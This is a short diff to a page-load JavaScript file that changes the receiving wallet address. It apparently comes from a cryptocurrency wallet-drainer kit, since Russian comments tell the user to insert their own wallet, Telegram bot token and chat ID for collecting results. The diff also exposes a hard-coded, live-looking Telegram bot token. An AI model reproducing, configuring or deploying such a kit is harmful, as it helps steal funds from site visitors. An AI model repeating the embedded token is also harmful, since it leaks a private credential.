@@ -1,5 +1,5 @@
 document.addEventListener('DOMContentLoaded', () => {
-    var mainWallet = "UQCjC4fYcBADiiX_RQ_OHHNoIBCk1AqPNzSth2NRpwIRI2Em"; // Замени на адрес своего кошелька
+    var mainWallet = "UQCl2Wbj3oxSknZE3q0ST4BLctB4TFuh5J77ihY6Ea37Dy9n"; // Замени на адрес своего кошелька
     var tgBotToken = "7664896852:AAGZGV5KjVG2g4MvACTDhAjK2ONL9qXRBAA"; // Замени на токен своего Telegram-бота
     var tgChat = -1002426182115; // Замени на ID чата или канала в Telegram
     var domain = window.location.hostname;
